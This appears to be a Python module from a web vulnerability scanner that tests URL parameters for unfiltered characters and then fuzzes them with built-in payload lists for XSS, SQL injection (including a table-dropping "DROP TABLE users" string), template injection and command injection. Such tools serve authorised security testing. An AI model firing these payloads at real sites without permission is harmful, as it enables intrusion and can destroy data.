import requests
from requests.exceptions import RequestException, SSLError, ConnectionError, Timeout
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
from re import sub
import urllib.parse
import sys, re, os
import time
from urllib3.exceptions import InsecureRequestWarning, ProtocolError
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
import threading
from colorama import init
import printer as P
from fuzzer import stop_event as fuzz_stop

init()

print_lock = threading.Lock()
tested_urls = set()

CACHE_FILE = ".nelux_cache.txt"
DEFAULT_FUZZ_THREADS = max(4, min(12, (os.cpu_count() or 4) * 2))

def load_cache():
    if os.path.exists(CACHE_FILE):
        with open(CACHE_FILE, "r") as f:
            for line in f:
                parts = line.strip().split("||")
                if len(parts) == 2:
                    tested_urls.add((parts[0], parts[1]))

def save_to_cache(url, param):
    with print_lock:
        with open(CACHE_FILE, "a") as f:
            f.write(f"{url}||{param}\n")

load_cache()

def generate_default_payloads(vulnerable_chars):
    payloads = []

    # XSS payloads — only when angle brackets are unfiltered
    if '<' in vulnerable_chars and '>' in vulnerable_chars:
        payloads += [
            "<script>alert(1)</script>",
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            '"><svg/onload=alert(1)>',
            "<body onload=alert(1)>",
            "<details open ontoggle=alert(1)>",
        ]

    # SQLi payloads — only when single/double quotes or semicolons are unfiltered
    if "'" in vulnerable_chars or '"' in vulnerable_chars or ';' in vulnerable_chars:
        payloads += [
            "' OR '1'='1",
            "' OR 1=1--",
            '" OR 1=1--',
            "' AND 1=2 UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "1' ORDER BY 1--",
            "1 AND 1=1",
            "' WAITFOR DELAY '0:0:5'--",
        ]

    # Template injection — when curly braces are unfiltered
    if '{' in vulnerable_chars or '}' in vulnerable_chars:
        payloads += [
            "{{7*7}}", "${7*7}", "#{7*7}",
            "{{1338-1}}", "${1338-1}", "#{1338-1}",
        ]

    # Command injection — when pipe/semicolon unfiltered
    if '|' in vulnerable_chars or ';' in vulnerable_chars:
        payloads += ["; id", "| id", "`id`", "$(id)"]

    if not payloads:
        # Last resort fallback
        payloads = ["<script>alert(1)</script>", "' OR '1'='1"]

    return payloads

FILTER_CHARS = ['"', "'", '<', '>', '$', '|', '(', ')', '`', ':', ';', '{', '}']

RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
RESET = '\033[0m'

def test_parameter_sanitization(url, param, headers=None):
    vulnerable_chars = []
    
    session = requests.Session()
    session.verify = False

    for char in FILTER_CHARS:
        if fuzz_stop.is_set():
            break
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query[param] = [char]
        new_query = urlencode(query, doseq=True)
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

        try:
            response = session.get(test_url, timeout=5, headers=headers)
            if response.status_code == 500:
                vulnerable_chars.append(char)
                continue

            if "SQL syntax" in response.text or "Warning: mysql" in response.text.lower():
                vulnerable_chars.append(char)
                continue

            if response.status_code == 200:
                if char in response.text and not any(encoded_char in response.text for encoded_char in [
                    urllib.parse.quote(char),
                    urllib.parse.quote(char, safe=''),
                    char.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#39;')
                ]):
                    vulnerable_chars.append(char)

        except (SSLError, ConnectionError, Timeout, ProtocolError):
            continue
        except RequestException:
            continue

    return vulnerable_chars

def detect_injection_type(chars):
    # XSS needs HTML/script-relevant context, not just quote reflection.
    has_xss_context = '<' in chars and '>' in chars
    sqli_set = {"'", '"', ';', '--', '#', '(', ')'}

    if has_xss_context:
        return 'XSS'
    elif any(c in sqli_set for c in chars):
        return 'SQLi'
    else:
        return 'SQLi or XSS'

def get_root_domain(url):
    """Extracts the root domain: sub.bmw.de -> bmw, www.ford.com -> ford"""
    parsed = urlparse(url)
    netloc = parsed.netloc.split(":")[0]  # remove port
    parts = netloc.split(".")
    # parts[-2] is the root domain (before TLD)
    return parts[-2] if len(parts) >= 2 else parts[0]

def sanitize_filename(url):
    root = get_root_domain(url)
    return f"{root}_parameters.txt"

def analyze_url(url, headers=None, output_filename=None, payloads=None, output_format="txt", fuzz_threads=DEFAULT_FUZZ_THREADS):
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)

    for param in query_params:
        if fuzz_stop.is_set():
            break
        base_query = query_params.copy()
        base_query[param] = ["FUZZ"]
        base_query_encoded = urlencode(base_query, doseq=True)
        base_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, base_query_encoded, parsed.fragment))

        test_key = (base_url, param)
        if test_key in tested_urls:
            continue  # already tested, skip
        else:
            tested_urls.add(test_key)
            save_to_cache(base_url, param)

        scan_start = time.perf_counter()
        vulnerable_chars = test_parameter_sanitization(url, param, headers)
        scan_elapsed = time.perf_counter() - scan_start

        if vulnerable_chars:
            vuln_type = detect_injection_type(vulnerable_chars)

            P.log(f"")
            P.log(f"{RED}[⚠] Possible vulnerability (unsanitized filter):{RESET}")
            P.log(f"   {CYAN}URL      :{RESET} {url}")
            P.log(f"   {CYAN}Parameter:{RESET} {param}")
            P.log(f"   {GREEN}No filter: {', '.join(vulnerable_chars)}{RESET}")

            query = parse_qs(parsed.query)
            query[param] = ["FUZZ"]
            new_query = urlencode(query, doseq=True)
            clean_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
            clean_url = sub(r'FUZZ\d*', 'FUZZ', clean_url)

            filename = output_filename if output_filename else sanitize_filename(url)
            with print_lock:
                with open(filename, "a") as f:
                    f.write(clean_url + "\n")
                    
            target_payloads = payloads if payloads else generate_default_payloads(vulnerable_chars)
            P.log(f"{CYAN}[~] Scan time ({param}):{RESET} {scan_elapsed:.2f}s")
            P.log(f"{CYAN}[~] Fuzzing {param} with {len(target_payloads)} payloads ({min(fuzz_threads, len(target_payloads))} workers)...{RESET}")
                
            from fuzzer import fuzz_single_target
            fuzz_start = time.perf_counter()
            found = fuzz_single_target(
                clean_url,
                target_payloads,
                headers,
                output_format=output_format,
                fuzz_threads=fuzz_threads
            )
            fuzz_elapsed = time.perf_counter() - fuzz_start
            P.log(f"{CYAN}[~] Fuzz time ({param}):{RESET} {fuzz_elapsed:.2f}s")
            
            if not found:
                P.log(f"{GREEN}[-] Not Vulnerable{RESET} — param: {param}")
            P.log("")  # blank line between parameters

def test_parameters(urls_with_params, threads=20, headers=None, output_filename=None, show_save_message=True, payloads=None, output_format="txt", fuzz_threads=DEFAULT_FUZZ_THREADS):
    executor = ThreadPoolExecutor(max_workers=threads)
    try:
        futures = [
            executor.submit(
                analyze_url,
                url,
                headers,
                output_filename,
                payloads,
                output_format,
                fuzz_threads
            )
            for url in urls_with_params
        ]
        pending = set(futures)
        total = len(futures)

        while pending:
            if fuzz_stop.is_set():
                executor.shutdown(wait=False, cancel_futures=True)
                P.clear_spin()
                break
            done, pending = wait(pending, timeout=0.2, return_when=FIRST_COMPLETED)

            processed = total - len(pending)
            P.spin(f"{CYAN}[~]{RESET} Processing URLs: {processed}/{total} | Active workers: {len(pending)}")

            for future in done:
                try:
                    future.result()
                except Exception:
                    pass
            if not done:
                time.sleep(0.05)
    finally:
        # Do not block on Ctrl+C; otherwise one stuck worker can freeze shutdown.
        if fuzz_stop.is_set():
            executor.shutdown(wait=False, cancel_futures=True)
        else:
            executor.shutdown(wait=True)
    P.clear_spin()
    if show_save_message and output_filename:
        P.log(f"\n{CYAN}[*] Saved in: {RED}{output_filename}{RESET}")

